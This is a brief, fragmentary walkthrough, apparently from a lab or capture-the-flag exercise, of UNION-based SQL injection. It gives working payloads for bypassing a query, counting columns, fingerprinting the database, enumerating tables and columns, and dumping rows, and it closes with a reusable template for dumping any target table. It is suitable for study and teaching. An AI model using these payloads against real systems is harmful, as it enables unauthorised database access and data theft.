...
' OR 1=1-- - What this does:

Breaks the original query Forces condition to always be true

Step 2 — Find number of columns

' UNION SELECT 1,2-- - Why this works:
...
' UNION SELECT @@version, database()-- - Why:
...
' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database()-- - Why this works:
...
' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='orders'-- - Why:
...
' UNION SELECT id, date FROM orders WHERE MONTH(date)=6 AND DAY(date)=14-- -
...
Applies logic MONTH(date)=6 AND DAY(date)=14
simple what i did:
...
Find columns ' UNION SELECT 1,2-- -
Tables ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
Columns ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='TARGET'-- -
Dump data ' UNION SELECT col1, col2 FROM TARGET-- -
